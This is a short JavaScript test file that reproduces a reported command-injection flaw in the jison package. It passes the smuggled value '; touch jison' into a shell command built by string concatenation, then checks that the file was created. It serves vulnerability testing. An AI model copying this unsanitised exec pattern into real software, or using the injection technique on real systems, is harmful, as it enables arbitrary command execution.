//https://hackerone.com/reports/690010
//the interal working of jison
test("Command Injection in jison", () => {
  exec = require("child_process").exec;
  const fs = require("fs");
  const path = "./jison";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let command = "; touch jison";
  exec("jison " + command, function (error) {
    if (error) {
      console.log(error);
      return;
    }
  });

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
